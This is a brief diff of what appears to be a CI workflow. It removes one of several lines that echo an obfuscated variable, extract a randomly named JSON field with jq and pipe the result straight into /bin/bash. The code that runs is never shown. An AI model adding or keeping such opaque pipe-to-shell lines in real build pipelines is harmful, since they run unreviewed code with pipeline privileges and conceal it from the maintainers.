@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$wrh60118" | jq -r .m20 | /bin/bash
           echo $ergqx8723 | jq -r .kwwx402 | /bin/bash
           printf '%s' "$ws154" | jq -r .fdldn0359 | /bin/bash
-          echo $kh307 | jq -r .lo831 | /bin/bash
           echo $iv4308 | jq -r .zccse4421 | /bin/bash
           echo $jgzsr8 | jq -r .qvm24 | /bin/bash
           echo $m9 | jq -r .yt5 | /bin/bash
